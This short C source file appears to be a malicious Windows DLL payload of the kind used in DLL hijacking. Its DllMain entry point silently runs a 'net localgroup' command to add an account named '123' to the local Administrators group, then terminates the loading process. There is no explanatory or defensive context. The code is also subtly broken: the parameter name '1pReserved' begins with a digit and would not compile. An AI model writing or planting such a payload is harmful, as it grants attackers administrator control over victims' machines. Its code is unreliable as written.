BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID 1pReserved)
{
  WinExec("net localgroup /add administrators 123",0); 
  ExitProcess(0); 
  return TRUE;
}
